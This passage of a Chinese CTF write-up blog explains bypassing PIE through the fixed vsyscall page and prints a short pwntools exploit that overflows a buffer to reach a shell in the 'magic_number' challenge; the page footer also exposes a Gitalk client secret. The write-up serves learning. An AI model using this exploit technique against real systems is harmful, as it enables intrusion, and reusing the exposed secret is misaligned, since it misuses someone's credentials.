+<p>就这几行代码，而且还有后门，汇编更简单就不贴了<br>但是难点在于除了canary以外，保护全开，这就意味着shellcode不能用，got表不可修改，最要命的是地址随机化。</p>
+<p>如果v5==0x12345678，那么执行system，但是随机数是在read之前赋给v5的，且函数只执行一次，实在想不出办法。</p>
+<p>终于大佬赛后发了exp，我才学到了一个新的技巧来绕过PIE——利用vsyscall</p>
+<p>在多次运行程序时你会发现，当所有地址都在随机变化时，最下面有个vsyscall段的地址一直稳定在<code>0xffffffffff600000-0xffffffffff601000</code>，那它到底是什么呢？</p>
+<p>对于某些系统调用，如gettimeofday来说，由于他们经常被调用，但是系统调用是用户态到内核态到用户态的一个过程，开销很大，如果每次被调用都要这么来回折腾一遍，就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p>
+<p>动态调试，发现system(‘/bin/sh’)的地址在这里</p>
+<p><img src="https://i.loli.net/2020/08/26/bMVAd1lmrTgSs7O.png" alt="image-20200826003915368"></p>
+<p>而在这里，你会发现一个很接近的地址，只是最低字节不相同，因此可以通过vsyscall滑动绕过，覆盖这里地址，以劫持到ip。</p>
+<p><img src="https://i.loli.net/2020/08/26/JYSMiNmga8cCzTs.png" alt="image-20200826004057378"></p>
+<hr>
+<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;183.129.189.60&#x27;,10010)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600400</span>)*<span class="number">4</span>+<span class="string">&#x27;\xA8&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>计算机什么边角都能利用啊，学习了学习了</p>
+<p><em><strong>Reference：</strong></em></p>
+<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/968">pwn中vsyscall的利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/">x86 架构下 Linux 的系统调用与 vsyscall, vDSO</a></p>
+<hr>
+<h1 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h1><p>总结一下，我好菜</p>
+<p>这都是我比赛没想出来的题目，做出来的题目也都比较水，各位师傅都有wp，我就不写了</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://ld1ng.top/2020/09/01/Aug_Match/">http://ld1ng.top/2020/09/01/Aug_Match/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/09/28/Sep_Match/">Sep_Match 2020</a>
+            
+            
+            <a class="next" rel="next" href="/2020/08/06/Heap/">堆溢出漏洞利用总结</a>
+            
+        </section>
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '458a98372426d92cae5a',
+        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
+        repo: 'ld1ng.github.io',
+        owner: 'Ld1ng',
+        admin: 'Ld1ng',
+        id: md5(location.pathname),
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+    </article>
+</div>
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>Ld1ng🍕 © 2020 - 2023 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
